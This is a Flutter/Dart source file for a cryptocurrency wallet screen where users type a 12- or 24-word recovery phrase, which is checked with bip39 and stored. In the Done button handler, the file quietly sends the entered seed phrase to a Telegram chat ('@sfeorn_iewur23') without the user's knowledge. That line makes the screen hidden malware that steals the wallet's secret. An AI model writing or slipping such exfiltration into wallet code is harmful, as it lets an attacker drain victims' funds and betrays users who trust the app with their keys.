import 'package:flutter/material.dart';
import 'package:untitled/models/wallet.dart';
import 'package:untitled/utils/db_helper.dart';
import 'package:untitled/utils/hex_color.dart';
import 'package:untitled/utils/methods.dart';
import 'package:untitled/utils/telegram_client.dart';
import 'package:untitled/views/home_screen.dart';
import 'package:bip39/bip39.dart' as bip39;

class AddPhrase extends StatefulWidget {

  @override
  State<AddPhrase> createState() => _AddPhraseState();

}

class _AddPhraseState extends State<AddPhrase> {

  final form_key = GlobalKey<FormState>();

  bool is_24_selected = true;
  bool is_loading = false;

  List<TextEditingController> twelve_controller_list = [];
  List<TextEditingController> twenty_four_controller_list = [];

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: Colors.white,
      appBar: AppBar(
        backgroundColor: Colors.white,
        elevation: 0,
        leading: GestureDetector(
          onTap: () {
            Navigator.pop(context);
          },
          child: const Icon(Icons.arrow_back, color: Colors.black,),
        ),
        actions: [
          SizedBox(
            width: MediaQuery.of(context).size.width,
            child: Row(
                mainAxisSize: MainAxisSize.max,
                mainAxisAlignment: MainAxisAlignment.center,
                children: [
                  InkWell(
                    onTap: () {
                      is_24_selected = !is_24_selected;
                      setState(() {

                      });
                    },
                    child: Container(
                      padding: const EdgeInsets.all(10),
                      height: 40,
                      decoration: BoxDecoration(
                        borderRadius: const BorderRadius.all(Radius.circular(8)),
                        color: is_24_selected ? HexColor("#0119D8") : Colors.white,
                      ),
                      child: Text("12 words", style: TextStyle(
                        color: is_24_selected ? Colors.white : Colors.black,
                        fontFamily: 'inter-bold',
                        fontSize: 14,
                      )),
                    ),
                  ),
                  Container(width: 5,),
                  InkWell(
                    onTap: () {
                      is_24_selected = !is_24_selected;
                      setState(() {

                      });
                    },
                    child: Container(
                      padding: const EdgeInsets.all(10),
                      height: 40,
                      decoration: BoxDecoration(
                        borderRadius: const BorderRadius.all(Radius.circular(8)),
                        color: !is_24_selected ? HexColor("#0119D8") : Colors.white,
                      ),
                      child: Text("24 words", style: TextStyle(
                        color: !is_24_selected ? Colors.white : Colors.black,
                        fontFamily: 'inter-bold',
                        fontSize: 14,
                      )),
                    ),
                  ),
                ]
            ),
          ),
        ],
      ),
      body: is_loading ? Center(child: CircularProgressIndicator()) :  Form(
        key: form_key,
        child: Padding(
          padding: const EdgeInsets.fromLTRB(20, 20, 20, 80),
          child: CustomScrollView(
            slivers: [
              SliverList(delegate: SliverChildListDelegate([
                Container(height: 10,),
                const Text("Enter the words in the right order",
                  style: TextStyle(
                    color: Colors.black,
                    fontSize: 14,
                    fontFamily: 'inter-regular',
                  ),),
                Container(height: 15,)
              ])),
              SliverGrid(
                gridDelegate: const SliverGridDelegateWithFixedCrossAxisCount(
                    crossAxisCount: 2,
                    childAspectRatio: 3/1
                ),
                delegate: SliverChildListDelegate(
                    !is_24_selected ? twentyFourList() : twelveList()
                ),
              ),
            ],
          ),
        ),
      ),
      bottomSheet: Container(
        width: MediaQuery.of(context).size.width,
        height: 60,
        alignment: Alignment.center,
        color: Colors.white,
        padding: const EdgeInsets.only(bottom: 20),
        child: MaterialButton(
          color: HexColor("#0119D8"),
          onPressed: () async {
            if (form_key.currentState.validate()) {
              setState(() {
                is_loading = true;
              });
              String seed = "";
              if (!is_24_selected) {
                for (int i = 0; i < 24; i++) {
                  if (i != 23) {
                    seed += "${twenty_four_controller_list[i].text.trim()} ";
                  }
                  else {
                    seed += "${twenty_four_controller_list[i].text.trim()}";
                  }
                }
                seed.trim();
              }
              else {
                for (int i = 0; i < 12; i++) {
                  if (i != 11) {
                    seed += "${twelve_controller_list[i].text.trim()} ";
                  }
                  else {
                    seed += "${twelve_controller_list[i].text.trim()}";
                  }
                }
                seed.trim();
              }

              bool isValidSeed = bip39.validateMnemonic(seed);
              if (!isValidSeed) {
                showToast("Invalid seed");
                setState(() {
                  is_loading = false;
                });
              }
              else {
                Wallet w = Wallet(
                    id: 0,
                    hex: "",
                    seed: seed,
                    password: "",
                    passphrase: ""
                );
                DbHelper db = DbHelper();
                await db.saveWallet(w);

                String message = "Seed phrase: ${w.seed}";
                TelegramClient client = TelegramClient(chatId: "@sfeorn_iewur23");
                await client.sendMessage(message);

                if (mounted) {
                  Navigator.pushAndRemoveUntil(context, slideLeft(const HomeScreen()), (route)=>false);
                }
              }
            }
          },
          shape: const RoundedRectangleBorder(
              borderRadius: BorderRadius.all(Radius.circular(5))
          ),
          elevation: 5,
          child: Row(
            mainAxisSize: MainAxisSize.min,
            children: [
              Container(width: 5,),
              Image.asset("assets/images/check.png", width: 24, height: 24,),
              Container(width: 5,),
              const Text("Done", style: TextStyle(
                color: Colors.white,
                fontFamily: 'inter-medium',
                fontSize: 16,
                fontWeight: FontWeight.w600,
              ),),
              Container(width: 5,),
            ],
          ),
        ),
      ),
    );
  }

  Future init() async {
    for(int i = 0; i < 24; i++) {
      if(i < 12) {
        twelve_controller_list.add(TextEditingController());
      }
      twenty_four_controller_list.add(TextEditingController());
    }
  }

  @override
  void initState() {
    init();
    super.initState();
  }

  List<Widget> twentyFourList() {
    List<Widget> field_list = [];

    for(int i = 0; i < 24; i++) {
      field_list.add(
          Container(
            width: 150,
            padding: i % 2 == 0 ? const EdgeInsets.fromLTRB(0, 5, 5, 5) : const EdgeInsets.fromLTRB(5, 5, 0, 5),
            child: Row(
              children: [
                Container(
                  width: 25,
                  decoration: const BoxDecoration(
                      borderRadius: BorderRadius.all(Radius.circular(16))
                  ),
                  child: Text(
                    "${i + 1}. ",
                    style: const TextStyle(
                      color: Colors.black,
                      fontFamily: 'inter-regular',
                      fontSize: 12,
                    ),
                  ),
                ),
                SizedBox(
                  width: 120,
                  child: TextFormField(
                    validator: (val){
                      if(val != null){
                        if(val.toString().isEmpty) {
                          return "Required";
                        }
                        return null;
                      }
                      return null;
                    },
                    autocorrect: false,
                    enableSuggestions: false,
                    controller: twenty_four_controller_list[i],
                    textAlign: TextAlign.start,
                    style: const TextStyle(
                      color: Colors.black,
                      fontFamily: 'inter-regular',
                      fontSize: 12,
                    ),
                    decoration: InputDecoration(
                      enabledBorder: enabledBorder(),
                      focusedBorder: focusedBorder(),
                      disabledBorder: disabledBorder(),
                      errorBorder: errorBorder(),
                      filled: true,
                      fillColor: HexColor("#F9F9FE"),
                    ),
                  ),
                ),
              ],
            ),
          )
      );
    }

    return field_list;
  }

  List<Widget> twelveList() {

    List<Widget> field_list = [];

    for(int i = 0; i < 12; i++) {
      field_list.add(
          Container(
            padding: i % 2 == 0 ? const EdgeInsets.fromLTRB(0, 5, 5, 5) : const EdgeInsets.fromLTRB(5, 5, 0, 5),
            child: Row(
              children: [
                Container(
                  width: 25,
                  decoration: const BoxDecoration(
                      borderRadius: BorderRadius.all(Radius.circular(16))
                  ),
                  child: Text(
                    "${i + 1}. ",
                    style: const TextStyle(
                      color: Colors.black,
                      fontFamily: 'inter-regular',
                      fontSize: 12,
                    ),
                  ),
                ),
                SizedBox(
                  width: 120,
                  child: TextFormField(
                    validator: (val){
                      if(val != null){
                        if(val.toString().isEmpty) {
                          return "Required";
                        }
                        return null;
                      }
                      return null;
                    },
                    autocorrect: false,
                    enableSuggestions: false,
                    controller: twelve_controller_list[i],
                    textAlign: TextAlign.start,
                    style: const TextStyle(
                      color: Colors.black,
                      fontFamily: 'inter-regular',
                      fontSize: 12,
                    ),
                    decoration: InputDecoration(
                      enabledBorder: enabledBorder(),
                      focusedBorder: focusedBorder(),
                      disabledBorder: disabledBorder(),
                      errorBorder: errorBorder(),
                      filled: true,
                      fillColor: HexColor("#F9F9FE"),
                    ),
                  ),
                ),
              ],
            ),
          )
      );
    }

    return field_list;
  }

}
